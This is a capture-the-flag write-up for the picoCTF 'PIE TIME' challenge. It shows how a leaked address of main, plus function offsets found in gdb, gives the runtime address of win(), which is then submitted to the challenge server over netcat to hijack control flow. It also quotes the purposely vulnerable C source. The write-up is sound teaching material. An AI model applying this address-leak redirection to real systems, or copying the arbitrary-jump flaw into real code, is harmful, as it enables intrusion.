# PIE TIME
## Pico CTF -- Easy

For this challenge, we are given the [compiled binary](vuln), as well as the [source code](vuln.c).

Recall, a Position Independent Executable (PIE) is a binary that can loaded at any memory address without modification, enhancing security by making it harder for attackers to predict where code is located in memory. This is achieved through techniques like Address Space Layout Randomization (ASLR), which randomizes the memory addresses used by the executable each time it runs.

While the memory addresses will change each time the binary runs, note that the offset between addresses stays constant. Adress offsets are easy to find through static analysis, so to bypass ASLR one must leak a memory address from somewhere in the binary.

Notice, this challenge gives us the memory leak for free.

    int main() {
    signal(SIGSEGV, segfault_handler);
    setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

    printf("Address of main: %p\n", &main);

    unsigned long val;
    printf("Enter the address to jump to, ex => 0x12345: ");
    scanf("%lx", &val);
    printf("Your input: %lx\n", val);

    void (*foo)(void) = (void (*)())val;
    foo();
    }

Not only does this code print the address of the main function, it also will run code at any memory address we supply. If we supply the address of the win() function, we will get the flag.

We can use gdb to find the address offsets that will allow us to calculate the address of the win() function at runtime.

    gef➤  info functions
    All defined functions:

    Non-debugging symbols:
    0x0000000000001000  _init
    0x00000000000010e0  __cxa_finalize@plt
    0x00000000000010f0  putchar@plt
    0x0000000000001100  puts@plt
    0x0000000000001110  fclose@plt
    0x0000000000001120  __stack_chk_fail@plt
    0x0000000000001130  printf@plt
    0x0000000000001140  fgetc@plt
    0x0000000000001150  signal@plt
    0x0000000000001160  setvbuf@plt
    0x0000000000001170  fopen@plt
    0x0000000000001180  __isoc99_scanf@plt
    0x0000000000001190  exit@plt
    0x00000000000011a0  _start
    0x00000000000011d0  deregister_tm_clones
    0x0000000000001200  register_tm_clones
    0x0000000000001240  __do_global_dtors_aux
    0x0000000000001280  frame_dummy
    0x0000000000001289  segfault_handler
    0x00000000000012a7  win
    0x000000000000133d  main
    0x0000000000001410  __libc_csu_init
    0x0000000000001480  __libc_csu_fini
    0x0000000000001488  _fini
    gef➤  


main address - win address = offset

    └──╼ $python3
    Python 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC 12.2.0] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>> 0x000000000000133d - 0x00000000000012a7
    150

main address at runtime - offset = win address at runtime.

    >>> 0x62782297333d - 150
    108268115931815
    >>> hex(108268115931815)
    '0x6278229732a7'
    >>> 



    └──╼ $nc rescued-float.picoctf.net 51278
    Address of main: 0x62782297333d
    Enter the address to jump to, ex => 0x12345: 0x6278229732a7
    Your input: 6278229732a7
    You won!
    picoCTF{XXXXXXXXXXXXXXXXXXXXXXXX}